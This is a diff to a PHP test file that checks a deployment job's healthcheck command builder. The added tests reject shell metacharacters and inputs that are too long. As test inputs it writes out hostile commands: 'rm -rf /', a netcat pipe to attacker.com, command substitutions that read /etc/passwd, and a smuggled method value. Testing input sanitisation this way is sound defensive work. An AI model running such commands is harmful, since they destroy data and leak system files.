@@ -5,6 +5,9 @@ use App\Models\Application;
 use App\Models\ApplicationDeploymentQueue;
 use App\Models\ApplicationSetting;
 use Illuminate\Support\Facades\Validator;
+use Tests\TestCase;
+
+uses(TestCase::class);
 
 beforeEach(function () {
     Mockery::close();
@@ -176,11 +179,11 @@ it('generates CMD healthcheck command directly', function () {
 it('strips newlines from CMD healthcheck command', function () {
     $result = callGenerateHealthcheckCommands([
         'health_check_type' => 'cmd',
-        'health_check_command' => "redis-cli ping\n&& echo pwned",
+        'health_check_command' => "redis-cli\nping",
     ]);
 
     expect($result)->not->toContain("\n")
-        ->and($result)->toBe('redis-cli ping && echo pwned');
+        ->and($result)->toBe('redis-cli ping');
 });
 
 it('falls back to HTTP healthcheck when CMD type has empty command', function () {
@@ -191,6 +194,68 @@ it('falls back to HTTP healthcheck when CMD type has empty command', function ()
 
     // Should fall through to HTTP path
     expect($result)->toContain('curl -s -X');
+});
+
+it('falls back to HTTP healthcheck when CMD command contains shell metacharacters', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => 'curl localhost; rm -rf /',
+    ]);
+
+    // Semicolons are blocked by runtime regex — falls back to HTTP healthcheck
+    expect($result)->toContain('curl -s -X')
+        ->and($result)->not->toContain('rm -rf');
+});
+
+it('falls back to HTTP healthcheck when CMD command contains pipe operator', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => 'echo test | nc attacker.com 4444',
+    ]);
+
+    expect($result)->toContain('curl -s -X')
+        ->and($result)->not->toContain('nc attacker.com');
+});
+
+it('falls back to HTTP healthcheck when CMD command contains subshell', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => 'curl $(cat /etc/passwd)',
+    ]);
+
+    expect($result)->toContain('curl -s -X')
+        ->and($result)->not->toContain('/etc/passwd');
+});
+
+it('falls back to HTTP healthcheck when CMD command exceeds 1000 characters', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => str_repeat('a', 1001),
+    ]);
+
+    // Exceeds max length — falls back to HTTP healthcheck
+    expect($result)->toContain('curl -s -X');
+});
+
+it('falls back to HTTP healthcheck when CMD command contains backticks', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_type' => 'cmd',
+        'health_check_command' => 'curl `cat /etc/passwd`',
+    ]);
+
+    expect($result)->toContain('curl -s -X')
+        ->and($result)->not->toContain('/etc/passwd');
+});
+
+it('uses sanitized method in full_healthcheck_url display', function () {
+    $result = callGenerateHealthcheckCommands([
+        'health_check_method' => 'INVALID;evil',
+        'health_check_host' => 'localhost',
+    ]);
+
+    // Method should be sanitized to 'GET' (default) in both command and display
+    expect($result)->toContain("'GET'")
+        ->and($result)->not->toContain('evil');
 });
 
 it('validates healthCheckCommand rejects strings over 1000 characters', function () {
@@ -253,14 +318,19 @@ function callGenerateHealthcheckCommands(array $overrides = []): string
     $application->shouldReceive('getAttribute')->with('settings')->andReturn($settings);
 
     $deploymentQueue = Mockery::mock(ApplicationDeploymentQueue::class)->makePartial();
+    $deploymentQueue->shouldReceive('addLogEntry')->andReturnNull();
 
     $job = Mockery::mock(ApplicationDeploymentJob::class)->makePartial();
 
-    $reflection = new ReflectionClass($job);
+    $reflection = new ReflectionClass(ApplicationDeploymentJob::class);
 
     $appProp = $reflection->getProperty('application');
     $appProp->setAccessible(true);
     $appProp->setValue($job, $application);
+
+    $queueProp = $reflection->getProperty('application_deployment_queue');
+    $queueProp->setAccessible(true);
+    $queueProp->setValue($job, $deploymentQueue);
 
     $method = $reflection->getMethod('generate_healthcheck_commands');
     $method->setAccessible(true);
